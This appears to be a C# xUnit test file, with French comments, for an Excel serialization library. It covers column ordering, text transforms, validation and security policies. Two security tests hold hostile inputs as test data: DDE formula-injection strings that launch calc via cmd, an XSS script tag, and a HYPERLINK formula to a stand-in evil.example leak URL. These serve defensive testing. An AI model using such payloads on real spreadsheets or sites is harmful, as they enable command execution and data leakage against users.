using System.IO.Compression;
using System.Xml.Linq;
using FlashXlsx;
using FlashXlsx.Abstractions;
using FlashXlsx.Abstractions.Internal;
using Xunit;

namespace FlashXlsx.Tests;

// --- Modèles de test pour les nouveaux attributs ---

public enum StatutStock
{
     [XlsxEnumMember("En stock")]
     Disponible = 10,

     [XlsxEnumMember("Réapprovisionnement")]
     EnCommande = 20,

     [XlsxEnumMember("Épuisé")]
     Rupture = 30
}

[XlsxSerializable]
public class ArticleCatalogue
{
     // Déclaré en 3e position dans la classe, mais forcé en 1re colonne via [XlsxColumnOrder(1)]
     [XlsxColumnOrder(1)]
     [XlsxRequired]
     [XlsxTrim(XlsxTrimMode.Both)]
     [XlsxCase(XlsxTextCase.Upper)]
     [XlsxRegex(@"^PRD-\d{4}$")]
     public string Code { get; set; } = string.Empty;

     [XlsxColumnOrder(2)]
     [XlsxTrim(XlsxTrimMode.Both)]
     [XlsxLength(3, 40)]
     public string Designation { get; set; } = string.Empty;

     [XlsxColumnOrder(3)]
     [XlsxRange(1, 500)]
     public int Quantite { get; set; }

     [XlsxColumnOrder(4)]
     [XlsxMin(0.01)]
     [XlsxMax(99999.99)]
     public decimal PrixUnitaire { get; set; }

     [XlsxColumnOrder(5)]
     [XlsxEnum(XlsxEnumMode.Description)]
     [XlsxAllowedValues("En stock", "Réapprovisionnement", "Épuisé")]
     public StatutStock Statut { get; set; }

     [XlsxColumnOrder(6)]
     [XlsxFormula("=C{Row}*D{Row}")]
     public decimal TotalLigne { get; set; }

     [XlsxColumnOrder(7)]
     [XlsxTrim(XlsxTrimMode.AllWhitespace)]
     [XlsxCase(XlsxTextCase.Lower)]
     public string? EmailFournisseur { get; set; }
}

[XlsxSerializable]
public class MessageUtilisateur
{
     public string Auteur { get; set; } = string.Empty;
     public string Commentaire { get; set; } = string.Empty;
}

// --- Suite de tests ---

public class FlashXlsxFeaturesAndSecurityTests
{
     [Fact]
     public async Task ColumnOrder_Trim_Case_Enum_And_Formula_ShouldWorkEndToEnd()
     {
          var articles = new List<ArticleCatalogue>
        {
            new()
            {
                Code = "  prd-1042  ", // Sera trimmé et mis en majuscules -> "PRD-1042"
                Designation = "  Clavier Mécanique RGB  ",
                Quantite = 4,
                PrixUnitaire = 89.50m,
                Statut = StatutStock.Disponible,
                EmailFournisseur = " Contact @ Fournisseur.FR " // AllWhitespace + Lower -> "contact@fournisseur.fr"
            }
        };

          using var ms = new MemoryStream();
          await FlashXlsxSerializer.WriteAsync(ms, articles);

          // 1. Vérification directe du XML généré (ordre des colonnes + balise <f> pour la formule)
          ms.Position = 0;
          using (var zip = new ZipArchive(ms, ZipArchiveMode.Read, leaveOpen: true))
          {
               var sheetEntry = zip.GetEntry("xl/worksheets/sheet1.xml");
               Assert.NotNull(sheetEntry);

               using var s = sheetEntry!.Open();
               var doc = XDocument.Load(s);
               XNamespace ns = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";

               var rows = doc.Descendants(ns + "row").ToList();
               Assert.Equal(2, rows.Count);

               // Ligne 1 (En-têtes triés selon [XlsxColumnOrder])
               var headers = rows[0].Elements(ns + "c").Select(c => c.Value).ToList();
               Assert.Equal(["Code", "Designation", "Quantite", "PrixUnitaire", "Statut", "TotalLigne", "EmailFournisseur"], headers);

               // Ligne 2 (Cellule F2 doit contenir la formule <f>C2*D2</f>)
               var cellF2 = rows[1].Elements(ns + "c").First(c => c.Attribute("r")?.Value == "F2");
               var formulaElement = cellF2.Element(ns + "f");
               Assert.NotNull(formulaElement);
               Assert.Equal("C2*D2", formulaElement!.Value);
          }

          // 2. Relecture complète du fichier et vérification des transformations
          ms.Position = 0;
          var imported = await FlashXlsxSerializer.ReadAllAsync<ArticleCatalogue>(ms);

          Assert.Single(imported);
          Assert.Equal("PRD-1042", imported[0].Code);
          Assert.Equal("Clavier Mécanique RGB", imported[0].Designation);
          Assert.Equal(4, imported[0].Quantite);
          Assert.Equal(89.50m, imported[0].PrixUnitaire);
          Assert.Equal(StatutStock.Disponible, imported[0].Statut);
          Assert.Equal("contact@fournisseur.fr", imported[0].EmailFournisseur);
     }

     [Fact]
     public async Task DeclarativeValidations_Range_Length_Regex_AllowedValues_ShouldReportExactStatuses()
     {
          var rawRows = new List<Dictionary<string, XlsxValue>>
        {
            new()
            {
                ["Code"] = "MAUVAIS-CODE",       // Échec Regex (^PRD-\d{4}$) -> PatternMismatch
                ["Designation"] = "AB",          // Échec Length (min 3) -> LengthInvalid
                ["Quantite"] = 9999,             // Échec Range (1..500) -> OutOfRange
                ["PrixUnitaire"] = 0m,           // Échec Min (0.01) -> OutOfRange
                ["Statut"] = "StatutInconnu",    // Échec AllowedValues -> ValueNotAllowed
                ["TotalLigne"] = 0m,
                ["EmailFournisseur"] = "a@b.fr"
            }
        };

          using var ms = new MemoryStream();
          await FlashXlsxSerializer.WriteDictionaryAsync(ms, rawRows);

          ms.Position = 0;
          var errors = new List<XlsxErrorContext>();
          var options = new XlsxReadOptions<ArticleCatalogue>()
              .WithErrorMode(XlsxErrorMode.ReportAndContinue)
              .WithErrorHandler((in err) => errors.Add(err));

          await FlashXlsxSerializer.ReadAllAsync(ms, options);

          Assert.Contains(errors, e => e.ColumnName == "Code" && e.Status == XlsxCellStatus.PatternMismatch);
          Assert.Contains(errors, e => e.ColumnName == "Designation" && e.Status == XlsxCellStatus.LengthInvalid);
          Assert.Contains(errors, e => e.ColumnName == "Quantite" && e.Status == XlsxCellStatus.OutOfRange);
          Assert.Contains(errors, e => e.ColumnName == "PrixUnitaire" && e.Status == XlsxCellStatus.OutOfRange);
          Assert.Contains(errors, e => e.ColumnName == "Statut" && e.Status == XlsxCellStatus.ValueNotAllowed);
     }

     [Fact]
     public async Task SecurityPolicy_Sanitize_ShouldEscapeFormulaInjectionOnExport()
     {
          var messages = new List<MessageUtilisateur>
        {
            new()
            {
                Auteur = "=cmd|'/C calc'!A0",
                Commentaire = "@SUM(1+1)*cmd|' /C calc'!A0"
            }
        };

          using var ms = new MemoryStream();
          var writeOpts = new XlsxWriteOptions<MessageUtilisateur>()
              .WithSecurityPolicy(XlsxSecurityPolicy.Sanitize);

          await FlashXlsxSerializer.WriteAsync(ms, messages, writeOpts);

          ms.Position = 0;
          var imported = await FlashXlsxSerializer.ReadAllAsync<MessageUtilisateur>(ms);

          Assert.Single(imported);
          // Les payloads commençant par '=' ou '@' doivent être neutralisés par une apostrophe (')
          Assert.StartsWith("'", imported[0].Auteur);
          Assert.StartsWith("'", imported[0].Commentaire);
     }

     [Fact]
     public async Task SecurityPolicy_Reject_ShouldBlockXssAndFormulaInjectionOnImport()
     {
          var rawRows = new List<Dictionary<string, XlsxValue>>
        {
            new()
            {
                ["Auteur"] = "Alice",
                ["Commentaire"] = "Texte parfaitement sain"
            },
            new()
            {
                ["Auteur"] = "Eve",
                ["Commentaire"] = "<script>alert('XSS')</script>"
            },
            new()
            {
                ["Auteur"] = "Mallory",
                ["Commentaire"] = "=HYPERLINK(\"http://evil.example/leak\")"
            }
        };

          using var ms = new MemoryStream();
          // Désactivation de la sanitisation à l'export pour simuler un fichier malveillant externe
          var rawWriteOpts = new XlsxWriteOptions().WithSecurityPolicy(XlsxSecurityPolicy.None);
          await FlashXlsxSerializer.WriteDictionaryAsync(ms, rawRows, rawWriteOpts);

          ms.Position = 0;
          var errors = new List<XlsxErrorContext>();
          var readOpts = new XlsxReadOptions<MessageUtilisateur>()
              .WithSecurityPolicy(XlsxSecurityPolicy.Reject)
              .WithErrorMode(XlsxErrorMode.ReportAndContinue)
              .WithErrorHandler((in err) => errors.Add(err));

          var imported = await FlashXlsxSerializer.ReadAllAsync(ms, readOpts);

          Assert.Equal(2, errors.Count);
          Assert.All(errors, e => Assert.Equal(XlsxCellStatus.SecurityViolation, e.Status));
          Assert.Equal("Texte parfaitement sain", imported[0].Commentaire);
     }
}